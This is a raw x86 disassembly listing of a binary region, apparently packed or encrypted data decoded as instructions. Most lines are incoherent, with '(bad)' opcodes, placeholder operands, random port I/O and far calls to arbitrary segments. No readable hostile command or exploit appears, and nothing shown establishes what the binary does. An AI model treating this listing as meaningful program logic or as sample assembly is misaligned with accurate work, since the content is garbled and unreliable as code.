  41587d:	cmp    BYTE PTR [ebp-0x1439baa6],0x2d
  415884:	mov    ds:0xba6ac136,eax
  415889:	(bad)  
  41588b:	pop    edi
  41588c:	xchg   esi,eax
  41588d:	lahf   
  41588e:	or     eax,0xfc55b8aa
  415893:	mov    bl,0xf2
  415895:	xchg   esi,eax
  415896:	aaa    
  415897:	and    BYTE PTR [esi],ch
  415899:	scas   al,BYTE PTR es:[edi]
  41589a:	dec    esp
  41589b:	or     al,0x82
  41589d:	das    
  41589e:	loope  0x4158e6
  4158a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158a1:	dec    edi
  4158a2:	outs   dx,DWORD PTR ds:[esi]
  4158a3:	mov    ebp,0xacd295d2
  4158a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158a9:	mov    ds:0xb736c3a7,al
  4158ae:	adc    eax,0x976bec14
  4158b3:	retf   0x3788
  4158b6:	pusha  
  4158b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158b8:	fisubr WORD PTR [ebp+0x6a]
  4158bb:	jo     0x4158ee
  4158bd:	sar    DWORD PTR [ecx],0xd3
  4158c0:	jp     0x41588a
  4158c2:	dec    ebx
  4158c3:	fsub   QWORD PTR [edi]
  4158c5:	pop    ebp
  4158c6:	cli    
  4158c7:	push   0xd9a05107
  4158cc:	(bad)  
  4158cd:	and    ebp,ebx
  4158cf:	ins    BYTE PTR es:[edi],dx
  4158d0:	pop    ebp
  4158d1:	mov    bl,0x75
  4158d3:	dec    ecx
  4158d4:	push   0x69fc3861
  4158d9:	add    DWORD PTR [esi-0x481163d2],0x22397cc9
  4158e3:	leave  
  4158e4:	xor    DWORD PTR [ebp-0x7a],ebp
  4158e7:	sbb    BYTE PTR [edx+ebp*8+0x4d],cl
  4158eb:	fcmovnb st,st(6)
  4158ed:	mov    al,0xa
  4158ef:	movaps xmm3,XMMWORD PTR [edx]
  4158f2:	inc    esi
  4158f3:	push   ebx
  4158f4:	push   ss
  4158f5:	int3   
  4158f6:	xor    al,dl
  4158f8:	ins    DWORD PTR es:[edi],dx
  4158f9:	and    al,0x72
  4158fb:	xor    ecx,DWORD PTR [ecx+0x1c982086]
  415901:	push   ds
  415902:	sub    BYTE PTR [edi+0x3dcd4ea3],cl
  415908:	sbb    eax,0x61eaa2cf
  41590d:	in     eax,dx
  41590e:	dec    eax
  41590f:	xchg   DWORD PTR fs:[edx+0x10cff9da],ecx
  415916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415917:	int3   
  415918:	mov    edi,0xee44569b
  41591d:	call   0xa66:0xc6a795d6
  415924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415925:	inc    esi
  415926:	lahf   
  415927:	test   al,0xec
  415929:	sub    eax,edx
  41592b:	dec    ebp
  41592c:	pop    edi
  41592d:	dec    edi
  41592e:	sar    BYTE PTR [ebx+ebx*4],1
  415931:	stos   BYTE PTR es:[edi],al
  415932:	mov    BYTE PTR [esi],bh
  415934:	dec    ebp
  415935:	lods   eax,DWORD PTR ds:[esi]
  415936:	ss data16 cmp al,0x14
  41593a:	or     bh,0xd8
  41593d:	push   esi
  41593e:	stos   BYTE PTR es:[edi],al
  41593f:	dec    esp
  415940:	(bad)  
  415942:	and    ebp,edx
  415944:	repnz cmp edx,esp
  415947:	neg    BYTE PTR [ebx-0x76fe95e7]
  41594d:	fidiv  WORD PTR [ecx-0x4d3fec7]
  415953:	daa    
  415954:	out    dx,al
  415955:	pusha  
  415956:	add    BYTE PTR [ebp+0x96791a7],ch
  41595c:	ret    
  41595d:	mov    dl,0xa7
  41595f:	rol    BYTE PTR [edi-0x7d4d63f4],0x13
  415966:	popf   
  415967:	add    al,0x82
  415969:	nop
  41596a:	mov    ebx,0xa477389b
  41596f:	mov    esi,0x3658dc32
  415974:	add    ebp,ecx
  415976:	xchg   edi,eax
  415977:	cmp    eax,0x180a3d2e
  41597c:	dec    ecx
  41597d:	lods   al,BYTE PTR ds:[esi]
  41597e:	lea    ecx,[ecx]
  415980:	dec    edx
  415981:	shl    edi,1
  415983:	(bad)  
  415985:	push   eax
  415986:	push   esp
  415987:	fcom   QWORD PTR [ecx]
  415989:	mov    ds:0x35d2a2d0,eax
  41598e:	jmp    0x4159aa
  415990:	pop    es
  415991:	jnp    0x415965
  415993:	lea    edi,[edi-0x9]
  415996:	test   eax,0xb144fbec
  41599b:	push   edx
  41599c:	mov    ebp,?
  41599e:	retf   0x8573
  4159a1:	cmp    al,0x5
  4159a3:	dec    esp
  4159a4:	xchg   edi,eax
  4159a5:	sub    esp,ebp
  4159a7:	inc    edi
  4159a8:	or     bh,ah
  4159aa:	push   ss
  4159ab:	mov    eax,0x3b413289
  4159b0:	lea    esi,[ebx+0x0]
  4159b3:	nop
  4159b4:	xor    ah,dh
  4159b6:	in     eax,0x7c
  4159b8:	adc    dh,BYTE PTR [edi]
  4159ba:	iret   
  4159bb:	enter  0x1528,0x2d
  4159bf:	ffreep st(1)
  4159c1:	push   0xffffff95
  4159c3:	adc    BYTE PTR [esi+0x56],dh
  4159c6:	mov    al,ds:0x8061a83f
  4159cb:	arpl   si,si
  4159cd:	loop   0x41599c
  4159cf:	add    BYTE PTR [edx+ebp*2-0x1],ch
  4159d3:	jbe    0x41596a
  4159d5:	shl    BYTE PTR [ebx],1
  4159d7:	sahf   
  4159d8:	xor    DWORD PTR [edi],edi
  4159da:	xchg   edi,eax
  4159db:	cmp    DWORD PTR [edi-0x18],ebp
  4159de:	adc    BYTE PTR [edx-0x4c],bh
  4159e1:	scas   eax,DWORD PTR es:[edi]
  4159e2:	das    
  4159e3:	mov    edi,0xde9f01cc
  4159e8:	jge    0x415974
  4159ea:	adc    DWORD PTR [esi-0x55eaae2f],edx
  4159f0:	call   0x85d75203
  4159f5:	test   al,0xb8
  4159f7:	clc    
  4159f8:	xor    dl,BYTE PTR [eax+0x5e]
  4159fb:	mov    esi,0x6930e3a5
  415a00:	mov    cl,0xca
  415a02:	fs dec ebp
  415a04:	ss pusha 
  415a06:	add    esi,DWORD PTR [edx+0x367f1bcc]
  415a0c:	dec    edi
  415a0d:	cmp    eax,0x82d5e9c4
  415a12:	push   0x4d
  415a14:	or     BYTE PTR [ebp-0x308d8768],bl
  415a1a:	jl     0x415a5a
  415a1c:	es retf 0x5410
  415a20:	(bad)  
  415a21:	adc    dh,BYTE PTR [edx+eax*1-0x32]
  415a25:	outs   dx,DWORD PTR ds:[esi]
  415a26:	call   0xbc37673b
  415a2b:	fwait
  415a2c:	mov    bh,0x47
  415a2e:	xchg   BYTE PTR es:[edi+0x5045196c],cl
  415a35:	inc    ebp
  415a36:	inc    eax
  415a37:	add    DWORD PTR [edi-0x5c],ebx
  415a3a:	mov    al,ah
  415a3c:	inc    esi
  415a3d:	out    dx,al
  415a3e:	test   eax,0x87fefa51
  415a43:	pop    ds
  415a44:	fptan  
  415a46:	repnz add esp,DWORD PTR [esi+0x49]
  415a4a:	sbb    esi,DWORD PTR ds:0xafd7a9e6
  415a50:	mov    ds:0x34c60cc5,al
  415a55:	js     0x415a0c
  415a57:	push   es
  415a58:	shr    DWORD PTR [esi],0xb2
  415a5b:	lds    esi,FWORD PTR [ebx-0x4b]
  415a5e:	dec    ebx
  415a60:	call   0x76661857
  415a65:	lahf   
  415a66:	mov    DWORD PTR [ecx+0x32],ecx
  415a69:	lods   al,BYTE PTR ds:[esi]
  415a6a:	int    0xe
  415a6c:	push   ebx
  415a6d:	mov    ch,0x1b
  415a6f:	(bad)  
  415a70:	lock or eax,DWORD PTR [ecx+0x19483749]
  415a77:	dec    ecx
  415a78:	lods   eax,DWORD PTR ds:[esi]
  415a79:	outs   dx,DWORD PTR ds:[esi]
  415a7a:	sub    ebp,DWORD PTR [esi+0x7af0d3ee]
  415a80:	loope  0x415aa8
  415a82:	ins    DWORD PTR es:[edi],dx
  415a83:	(bad)  
  415a85:	mov    bh,0x18
  415a87:	cmp    edx,0xd17a6a44
  415a8d:	dec    edx
  415a8e:	sub    ebx,esi
  415a90:	push   ebp
  415a91:	push   edx
  415a92:	inc    ebx
  415a93:	out    dx,eax
  415a94:	test   DWORD PTR [ecx],eax
  415a96:	lock or esi,edi
  415a99:	jg     0x415ac2
  415a9b:	outs   dx,DWORD PTR ds:[esi]
  415a9c:	mov    ebx,0xba96721f
  415aa1:	jmp    0x415aa7
  415aa3:	lods   al,BYTE PTR ds:[esi]
  415aa4:	std    
  415aa5:	cmp    al,0x75
  415aa7:	jno    0x415a59
  415aa9:	cmp    BYTE PTR [ecx-0x58],al
  415aac:	scas   eax,DWORD PTR es:[edi]
  415aad:	add    DWORD PTR [ebx+0x1192dbee],0xe6beaf
  415ab7:	dec    ecx
  415ab8:	test   DWORD PTR [esi+0x63dcff92],eax
  415abe:	in     al,0x2f
  415ac0:	fist   WORD PTR [ebp-0x53af31bb]
  415ac6:	sbb    eax,0x2d062836
  415acb:	push   ebx
  415acd:	adc    ah,BYTE PTR [ecx-0x53de9ecd]
  415ad3:	cmp    eax,DWORD PTR [edi+0x8448f0d]
  415ad9:	or     BYTE PTR [edx+0x3b],0x3a
  415add:	fist   WORD PTR [edi+0x36]
  415ae0:	or     eax,DWORD PTR [eax]
  415ae2:	push   eax
  415ae3:	jle    0x415aaf
  415ae5:	call   0xa00cceb3
  415aea:	xor    BYTE PTR [esi+0x76c2923f],al
  415af0:	icebp  
  415af1:	cmp    dl,BYTE PTR [ebp+ebp*2-0x6f]
  415af5:	fwait
  415af6:	dec    ecx
  415af7:	xlat   BYTE PTR ds:[ebx]
  415af8:	adc    cl,ch
  415afa:	jns    0x415b31
  415afc:	jne    0x415a9b
  415afe:	pop    edi
  415aff:	jg     0x415ae5
  415b01:	mov    BYTE PTR [ebx],cl
  415b03:	call   0x3a04:0x79fbe9d5
  415b0a:	imul   esi,eax,0xffffffc3
  415b0d:	mov    BYTE PTR [eax+edi*1],ah
  415b10:	std    
  415b11:	test   eax,0x33e3567a
  415b16:	jnp    0x415aea
  415b18:	mov    BYTE PTR [ebx-0x1896dca6],bh
  415b1e:	pushf  
  415b1f:	xchg   esi,eax
  415b20:	aam    0xe4
  415b22:	inc    esi
  415b23:	push   0xfffffffc
  415b25:	mov    ds:0xadb3af4f,al
  415b2a:	ja     0x415b8a
  415b2c:	xchg   esp,eax
  415b2d:	imul   edx,DWORD PTR [ebx],0x87427258
  415b33:	xor    bl,bh
  415b35:	xor    DWORD PTR [ebx+ecx*4-0x4],edi
  415b39:	jmp    0x42a8:0x3d75b108
  415b40:	and    eax,DWORD PTR [eax]
  415b42:	adc    BYTE PTR [edx+0x20],0x45
  415b46:	dec    ebp
  415b47:	loop   0x415b8d
  415b49:	dec    esp
  415b4a:	inc    ebp
  415b4b:	and    eax,0xe3e29963
  415b50:	int    0xb6
  415b52:	in     eax,0xcd
  415b54:	push   ebx
  415b55:	leave  
  415b56:	pop    ebp
  415b57:	pop    esp
  415b58:	movd   mm3,ebx
  415b5b:	dec    esi
  415b5c:	xor    BYTE PTR ds:0xc070970b,dh
  415b62:	or     BYTE PTR [ebx-0x20bc1049],bl
  415b68:	cmp    bl,BYTE PTR [edi+0x6d]
  415b6b:	jns    0x415be3
  415b6d:	popf   
  415b6e:	paddq  mm4,QWORD PTR [edx-0x53353fd]
  415b75:	nop
  415b76:	stos   DWORD PTR es:[edi],eax
  415b77:	out    0x6,al
  415b79:	ins    DWORD PTR es:[edi],dx
  415b7a:	shr    DWORD PTR [edx-0x44],0xa0
  415b7e:	jl     0x415b2d
  415b80:	retf   0x1b38
  415b83:	pop    ecx
  415b84:	xor    dh,BYTE PTR [ebp-0x19]
  415b87:	and    edx,ebp
  415b89:	int3   
  415b8a:	mov    edi,0x7a7a7b89
  415b8f:	and    al,BYTE PTR [edi]
  415b91:	mov    eax,ds:0xeb12d4ed
  415b96:	ds loopne 0x415bdc
  415b99:	call   0xc537:0xf01cef8c
  415ba0:	mov    bh,0x12
  415ba2:	mov    esi,0x190e22c
  415ba7:	xchg   esp,eax
  415ba8:	addr16 jno 0x415c2a
  415bab:	xchg   ebx,eax
  415bac:	ds push ecx
  415bae:	mov    dl,0x61
  415bb0:	inc    ebp
  415bb1:	cmp    ch,BYTE PTR [ebx-0x36]
  415bb4:	cmc    
  415bb5:	jo     0x415c0a
  415bb7:	jo     0x415b90
  415bb9:	cld    
  415bba:	or     al,0x58
  415bbc:	mov    ?,edi
  415bbe:	dec    ecx
  415bbf:	mov    BYTE PTR [edi+0x56],bl
  415bc2:	in     eax,0xc8
  415bc4:	xor    al,0x70
  415bc6:	jae    0x415c3d
  415bc8:	jbe    0x415c05
  415bca:	or     DWORD PTR [esi+edi*2+0x7f3f52a6],0xef070638
  415bd5:	dec    ebx
  415bd6:	call   0x18a9:0xf4502a15
  415bdd:	(bad)  [ebx+0x3ce4e703]
  415be3:	mov    edi,0xb05e8746
  415be8:	mov    esi,0x66a7de6c
  415bed:	rcr    BYTE PTR [ecx+0x573e23f1],0xc8
  415bf4:	mov    esp,0x94d3d1ef
  415bf9:	mov    ebp,0xa59b6ad
  415bfe:	data16 and al,0x8f
  415c01:	pop    ds
  415c02:	cmc    
  415c03:	fcmovb st,st(4)
  415c05:	test   al,0xff
  415c07:	sbb    ah,dl
  415c09:	lds    ebx,FWORD PTR [eax-0x74561079]
  415c0f:	xchg   edx,eax
  415c10:	and    BYTE PTR ds:0xc0502e57,ah
  415c16:	cmp    BYTE PTR [eax-0x5fb4dd37],0x29
  415c1d:	(bad)  
  415c1e:	fnstenv [eax-0x503502a]
  415c24:	dec    edx
  415c25:	jne    0x415bab
  415c27:	hlt    
  415c28:	cmp    BYTE PTR ds:0xd88da345,dh
  415c2e:	xchg   esi,eax
  415c2f:	pop    eax
  415c30:	mov    dl,0xd7
  415c32:	and    DWORD PTR [eax],0x59
  415c35:	out    dx,al
  415c36:	xor    al,0xa9
  415c38:	rol    DWORD PTR [esi+0x24],0x35
  415c3c:	out    dx,al
  415c3d:	sub    al,0x44
  415c3f:	cli    
  415c40:	push   0xfdf0bbcd
  415c45:	scas   al,BYTE PTR es:[edi]
  415c46:	sub    ebx,DWORD PTR [eax+0x4f]
  415c49:	ret    
  415c4a:	call   0x99f1d2fc
  415c4f:	popf   
  415c50:	xlat   BYTE PTR ds:[ebx]
  415c51:	jns    0x415bee
  415c53:	sahf   
  415c54:	mov    eax,0x93d89c58
  415c59:	jnp    0x415c46
  415c5b:	jecxz  0x415c5c
  415c5d:	sbb    dl,al
  415c5f:	inc    ebp
  415c60:	int3   
  415c61:	mov    cl,0xf9
  415c63:	sbb    esp,esi
  415c65:	sub    dl,bh
  415c67:	jno    0x415c98
  415c69:	lahf   
  415c6a:	loop   0x415c32
  415c6c:	clc    
  415c6d:	adc    ebx,ebx
  415c6f:	ret    0x2f22
  415c72:	ret    
  415c73:	add    DWORD PTR [edx-0x62253cbd],edi
  415c79:	dec    edx
  415c7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c7b:	daa    
  415c7c:	sar    BYTE PTR [eax+0x22],cl
  415c7f:	push   ebp
  415c80:	cdq    
  415c81:	sbb    esp,0x6dc507b7
  415c87:	pop    ebp
  415c88:	not    bh
  415c8a:	sub    BYTE PTR [ebp-0x7d],0xc4
  415c8e:	aaa    
  415c8f:	or     ah,dl
  415c91:	mov    dl,0x6f
  415c93:	iret   
  415c94:	xchg   ebp,eax
  415c95:	mov    ah,BYTE PTR [ecx+0x70]
  415c98:	clc    
  415c99:	mov    ah,bl
  415c9b:	(bad)
  415c9e:	fcomp  DWORD PTR [ecx+0x6c]
  415ca1:	cmp    ecx,ebp
  415ca3:	adc    DWORD PTR [eax],ebx
  415ca5:	push   esi
  415ca6:	fwait
  415ca7:	jmp    0x346b66e7
  415cac:	jg     0x415caf
  415cae:	pop    ebx
  415caf:	cmp    eax,0xee6848f5
  415cb4:	sub    ch,BYTE PTR [edi+0x11e42949]
  415cba:	out    dx,eax
  415cbb:	imul   BYTE PTR [ebx]
  415cbd:	popf   
  415cbe:	xor    BYTE PTR [edx+0x2e],0x35
  415cc2:	test   DWORD PTR [edi-0x1],esi
  415cc5:	adc    al,0x64
  415cc7:	xchg   DWORD PTR [edx+edx*1-0x22752d95],eax
  415cce:	scas   al,BYTE PTR es:[edi]
  415ccf:	in     eax,0x3b
  415cd1:	lock inc ebp
  415cd3:	sti    
  415cd4:	push   esi
  415cd5:	pop    ss
  415cd6:	mov    ecx,0x9ae5f10
  415cdb:	and    dl,BYTE PTR [edi+0x69]
  415cde:	leave  
  415cdf:	ja     0x415ce5
  415ce1:	sbb    al,0xf2
  415ce3:	xor    BYTE PTR [eax-0x1],0x70
  415ce7:	aam    0x74
  415ce9:	fwait
  415cea:	pop    esi
  415ceb:	gs dec esi
  415ced:	mov    ecx,0xcc9b263e
  415cf2:	(bad)  
  415cf3:	das    
  415cf4:	clc    
  415cf5:	(bad)  
  415cf6:	cmp    ebx,edi
  415cf8:	sub    al,0x8d
  415cfa:	inc    edi
  415cfb:	mov    dh,0x98
  415cfd:	(bad)  
  415cfe:	mov    esi,0xc1e12068
  415d03:	popf   
  415d04:	mov    bh,0x65
  415d06:	out    dx,al
  415d07:	ror    BYTE PTR [edi],0x4f
  415d0a:	(bad)  
  415d0b:	fwait
  415d0c:	mov    al,ds:0x10ab573d
  415d11:	test   BYTE PTR [ecx-0xc],cl
  415d14:	mov    dl,cl
  415d16:	test   eax,0x634d70b4
  415d1c:	xor    eax,0xc6a3b52c
  415d21:	sbb    DWORD PTR [ecx+0x759a6bbc],0xffffffcf
  415d28:	int3   
  415d29:	mov    bl,0xb1
  415d2b:	cmp    dl,BYTE PTR [ecx]
  415d2d:	adc    ebp,DWORD PTR [ebp*4-0x7823bca8]
  415d34:	sub    DWORD PTR [ecx+0x6c],edi
  415d37:	sbb    DWORD PTR [ebx],edx
  415d39:	sbb    eax,0xbd12a722
  415d3e:	cmp    eax,0x28482708
  415d43:	jg     0x415da1
  415d45:	xor    eax,0xefa63163
  415d4a:	mov    cl,0x3
  415d4c:	leave  
  415d4d:	pop    esp
  415d4e:	repnz dec edx
  415d50:	cmp    esi,0xbadc40de
  415d56:	clc    
  415d57:	addr16 pop ecx
  415d59:	emms   
  415d5b:	pop    eax
  415d5c:	adc    ebx,DWORD PTR [ecx+ebp*1+0x6d87dc05]
  415d63:	jns    0x415cee
  415d65:	fld    DWORD PTR [ecx-0x23]
  415d68:	jecxz  0x415de7
  415d6a:	(bad)  
  415d6b:	mov    ecx,0xba062676
  415d70:	and    dh,BYTE PTR [edi+0x5c16044c]
  415d76:	int    0xba
  415d78:	fidivr WORD PTR [ecx+0x2]
  415d7b:	inc    ecx
  415d7c:	mov    WORD PTR [esi-0x6e1d8eb4],?
  415d82:	sbb    DWORD PTR [edi+0x75f48a21],0xffffffed
  415d89:	mov    ch,0xbf
  415d8b:	aad    0x74
  415d8d:	jne    0x415d1a
  415d8f:	pop    ds
  415d90:	xlat   BYTE PTR ds:[ebx]
  415d91:	cli    
  415d92:	adc    al,0x6d
  415d94:	arpl   WORD PTR [ecx+0x38],bp
  415d97:	adc    al,dh
  415d99:	loopne 0x415dfe
  415d9b:	and    edx,edi
  415d9d:	cmp    eax,0x4a8bbce8
  415da2:	push   ds
  415da3:	lods   al,BYTE PTR ds:[esi]
  415da4:	xchg   ebx,eax
  415da5:	cmp    bl,dh
  415da7:	xlat   BYTE PTR ds:[ebx]
  415da8:	iret   
  415da9:	inc    ebp
  415daa:	addr16 mov ah,0x26
  415dad:	loop   0x415dd8
  415daf:	(bad)  
  415db0:	in     al,dx
  415db1:	out    dx,al
  415db2:	add    al,0xce
  415db4:	dec    edi
  415db5:	lods   al,BYTE PTR ds:[esi]
  415db6:	cmp    al,0x4b
  415db8:	sti    
  415db9:	adc    esi,DWORD PTR [ebp+0x2c]
  415dbc:	pop    edx
  415dbd:	add    bl,bl
  415dbf:	retf   
  415dc0:	aas    
  415dc1:	mov    esp,0x55fa1000
  415dc6:	and    eax,0x6abf7bc9
  415dcb:	inc    esp
  415dcc:	add    DWORD PTR [esi],edx
  415dce:	fwait
  415dcf:	dec    esp
  415dd0:	pushf  
  415dd1:	jge    0x415e4a
  415dd3:	mov    bl,0xdc
  415dd5:	push   0xffffffc5
  415dd7:	jns    0x415d7a
  415dd9:	xchg   esi,eax
  415dda:	adc    BYTE PTR [ebp+0x4d],dh
  415ddd:	push   es
  415dde:	jbe    0x415de3
  415de0:	cmp    eax,0xac3aa789
  415de5:	dec    esi
  415de6:	xor    esi,DWORD PTR [esi+0x25cd7965]
  415dec:	mov    bh,0x1a
  415dee:	mov    edx,0x6011a05c
  415df3:	jb     0x415e19
  415df5:	or     eax,edx
  415df7:	adc    dh,BYTE PTR [esi+0x4495192c]
  415dfd:	arpl   WORD PTR [ebp-0x2a16616a],cx
  415e03:	mov    edx,0x54885382
  415e08:	xor    bh,BYTE PTR [ebx]
  415e0a:	pop    ds
  415e0b:	icebp  
  415e0c:	jle    0x415dd0
  415e0e:	outs   dx,BYTE PTR ds:[esi]
  415e0f:	repz fldcw WORD PTR [edi-0x5e]
  415e13:	into   
  415e14:	in     eax,dx
  415e15:	pop    esp
  415e16:	inc    eax
  415e17:	cmp    eax,0x32108376
  415e1c:	imul   ebx,ebp,0xd45317ef
  415e22:	cmp    edx,DWORD PTR [edi]
  415e24:	mov    DWORD PTR [esi],edi
  415e26:	jmp    0x415dd5
  415e28:	dec    DWORD PTR [ebp+0x51157f68]
  415e2e:	jle    0x415ea8
  415e30:	xlat   BYTE PTR ds:[ebx]
  415e31:	shl    BYTE PTR [ecx+0x60],0x8d
  415e35:	shr    ebx,cl
  415e37:	mov    ds,WORD PTR [eax]
  415e39:	xor    ecx,DWORD PTR [edx-0x7961e343]
  415e3f:	pop    ecx
  415e40:	mov    WORD PTR [eax],ds
  415e42:	sub    al,0xb1
  415e44:	test   eax,edx
  415e46:	(bad)  
  415e47:	fild   DWORD PTR [edx]
  415e49:	xchg   edi,eax
  415e4a:	push   0xffffffc3
  415e4c:	cli    
  415e4d:	inc    esi
  415e4e:	sbb    DWORD PTR [edi-0x1219d5df],ebx
  415e54:	mov    ch,BYTE PTR [edi-0x19]
  415e57:	enter  0x6cba,0xfb
  415e5b:	jg     0x415ea9
  415e5d:	push   eax
  415e5e:	in     eax,dx
  415e5f:	pushf  
  415e60:	test   al,0xf3
  415e62:	call   0x60f1:0xa106372b
  415e69:	aas    
  415e6a:	adc    al,0x45
  415e6c:	push   edi
  415e6d:	in     eax,dx
  415e6e:	push   ss
  415e6f:	adc    cl,BYTE PTR [esi+0x25f7df9a]
  415e75:	sti    
  415e76:	pop    esp
  415e77:	push   esp
  415e78:	in     eax,dx
  415e79:	sbb    esi,edi
  415e7b:	add    ah,BYTE PTR [edx-0x54b80eda]
  415e81:	sbb    BYTE PTR [edi+0x77],0x7c
  415e85:	fcomi  st,st(2)
  415e87:	push   0xffffffef
  415e89:	sub    al,0x8c
  415e8b:	or     cl,bh
  415e8d:	inc    ebp
  415e8e:	mov    bl,0x67
  415e90:	pop    eax
  415e91:	xor    al,BYTE PTR [edx+eiz*1]
  415e94:	jbe    0x415e51
  415e96:	sbb    eax,0xdad1a013
  415e9b:	(bad)  
  415e9c:	test   DWORD PTR [edx-0x41077626],edx
  415ea2:	and    BYTE PTR ds:0x36397ab6,0x4c
  415ea9:	adc    esi,edi
  415eab:	mov    ss,WORD PTR [ebp-0x33d71e5a]
  415eb1:	ror    DWORD PTR [eax-0x485ad71e],cl
  415eb7:	jns    0x415ef2
  415eb9:	leave  
  415eba:	adc    al,0xe1
  415ebc:	push   esp
  415ebd:	in     eax,0x66
  415ebf:	retf   
  415ec0:	dec    eax
  415ec1:	loopne 0x415e70
  415ec3:	in     al,dx
  415ec4:	jns    0x415e73
  415ec6:	xor    DWORD PTR [eax+edx*8],edi
  415ec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415eca:	aad    0xc8
  415ecc:	jge    0x415e89
  415ece:	imul   esp,DWORD PTR [ebx+0x67e5d86f],0x36
  415ed5:	loope  0x415f12
  415ed7:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  415ed9:	and    eax,0x795eb7b5
  415ede:	fnstsw WORD PTR [ecx]
  415ee0:	mov    esi,0x41593184
  415ee5:	data16 lahf 
  415ee7:	mov    dh,0xde
  415ee9:	pop    edi
  415eea:	sahf   
  415eeb:	adc    eax,0xc912994a
  415ef0:	adc    edx,esp
  415ef2:	sbb    BYTE PTR [ecx-0x4e],cl
  415ef5:	cmp    ebx,edi
  415ef7:	adc    eax,0xfc951cce
  415efc:	inc    eax
  415efd:	jmp    0xbec4:0x2cf1cc88
  415f04:	pop    ss
  415f05:	enter  0xcc7a,0xd5
  415f09:	mov    ds,WORD PTR [ebp-0x3d]
  415f0c:	mov    dh,0xa9
  415f0e:	xchg   edx,eax
  415f0f:	mov    BYTE PTR [esi+0x6a],ah
  415f12:	jno    0x415ea1
  415f14:	cmp    eax,0x13b899f6
  415f19:	jecxz  0x415efa
  415f1b:	jg     0x415f5b
  415f1d:	inc    eax
  415f1e:	mov    eax,ds:0x193aa762
  415f23:	push   eax
  415f24:	sbb    ebp,edx
  415f26:	or     ch,BYTE PTR [ebx-0x7c]
  415f29:	push   ss
  415f2a:	inc    ecx
  415f2b:	push   edi
  415f2c:	int    0x4c
  415f2e:	add    al,0xe9
  415f30:	(bad)  
  415f31:	ss retf 
  415f33:	enter  0x41b6,0x13
  415f37:	and    al,0xa7
  415f39:	cmp    ecx,DWORD PTR [ecx+0x1202eb86]
  415f3f:	inc    ebp
  415f40:	cmc    
  415f41:	jne    0x415ee7
  415f43:	div    DWORD PTR [ecx]
  415f45:	cmp    ebp,DWORD PTR [ecx]
  415f47:	push   edi
  415f48:	cwde   
  415f49:	jns    0x415f94
  415f4b:	mov    BYTE PTR [esi-0x41],0x84
  415f4f:	das    
  415f50:	iret   
  415f51:	dec    edi
  415f52:	mov    ebx,0x853051f0
  415f57:	dec    ebp
  415f58:	mov    cl,bh
  415f5a:	repnz cli 
  415f5c:	sub    esi,ebx
  415f5e:	imul   esi,DWORD PTR [edx+edi*1],0x1546b44f
  415f65:	pop    ds
  415f66:	das    
  415f67:	fs jp  0x415f78
  415f6a:	jmp    0xd7e179b3
  415f6f:	inc    eax
  415f70:	xor    ah,0x27
  415f73:	push   ds
  415f74:	outs   dx,DWORD PTR ds:[esi]
  415f75:	adc    DWORD PTR [edi],ecx
  415f77:	jns    0x334d0705
  415f7d:	or     ecx,DWORD PTR [edx+0x36d5beff]
  415f83:	mov    cl,0x70
  415f85:	xor    eax,0x4f4efa68
  415f8a:	(bad)  
  415f8b:	mov    esi,0xe8e5bb31
  415f90:	mov    esp,0x593fc818
  415f95:	imul   ebx,DWORD PTR [ebx],0x3734a658
  415f9b:	cs jno 0x415f5b
  415f9e:	dec    ebx
  415f9f:	loopne 0x415f25
  415fa1:	mov    bh,cl
  415fa3:	or     dh,BYTE PTR [eax]
  415fa5:	cmp    BYTE PTR [esi+0x45a9b61b],ah
  415fab:	xor    DWORD PTR [edi-0x7f],ebx
  415fae:	jp     0x415f48
  415fb0:	addr16 aaa 
  415fb2:	cmp    eax,0x3caf094e
  415fb7:	mov    dl,0x75
  415fb9:	imul   ebx,DWORD PTR [edi-0x265e7d1c],0x761e7e82
  415fc3:	hlt    
  415fc4:	mov    eax,edx
  415fc6:	or     BYTE PTR ds:0xc1d4997d,0x1f
  415fcd:	pusha  
  415fce:	dec    eax
  415fcf:	loop   0x415fdb
  415fd1:	inc    edi
  415fd2:	fdivp  st(7),st
  415fd4:	cdq    
  415fd5:	frstor [ecx-0x6e926b99]
  415fdb:	pop    edi
  415fdc:	outs   dx,BYTE PTR ds:[esi]
  415fdd:	push   eax
  415fde:	pop    ebp
  415fdf:	ja     0x415f70
  415fe1:	ins    DWORD PTR es:[edi],dx
  415fe2:	sbb    bl,al
  415fe4:	stos   BYTE PTR es:[edi],al
  415fe5:	add    DWORD PTR [esi-0x1c],eax
  415fe8:	push   esp
  415fe9:	xchg   ecx,eax
  415fea:	dec    edi
  415feb:	pop    ss
  415fec:	shl    DWORD PTR [ebx-0x32],cl
  415fef:	mov    bh,0x73
  415ff1:	pop    ax
  415ff3:	sti    
  415ff4:	fcomp  QWORD PTR [ebx+0x5e]
  415ff7:	shr    bl,0x30
  415ffa:	or     BYTE PTR [ebx],0xe3
  415ffd:	sub    dl,BYTE PTR [ecx+0x29]
  416000:	add    eax,0xc899cd46
  416005:	sar    DWORD PTR ds:0x8011aa90,cl
  41600b:	out    0x4e,eax
  41600d:	sub    eax,0x233e59e1
  416012:	jge    0x416059
  416014:	test   dl,ch
  416016:	mov    esp,0xd50167da
  41601b:	mov    al,0xe3
  41601d:	xor    BYTE PTR [edi+0x3e],bl
  416020:	pop    ebp
  416021:	push   edi
  416022:	inc    ebx
  416023:	inc    esp
  416024:	mov    eax,esi
  416026:	adc    DWORD PTR [edi-0x1f],eax
  416029:	and    DWORD PTR [edx*2-0x6dbe7594],esp
  416030:	out    dx,eax
  416031:	test   eax,0x4fd74a79
  416036:	sub    DWORD PTR [edi-0x16],edx
  416039:	int    0xf2
  41603b:	xchg   ebp,eax
  41603c:	xor    DWORD PTR ds:0x8d409a3a,edi
  416042:	push   ebx
  416043:	adc    DWORD PTR [ecx],ebx
  416045:	out    0x65,eax
  416047:	fld    DWORD PTR [eax+edx*1]
  41604a:	in     eax,0x52
  41604c:	jae    0x416076
  41604e:	sar    bl,1
  416050:	std    
  416051:	popf   
  416052:	pop    ebp
  416053:	mov    ah,BYTE PTR ds:[edi+0x64]
  416057:	xchg   edx,eax
  416058:	jnp    0x4160b9
  41605a:	push   eax
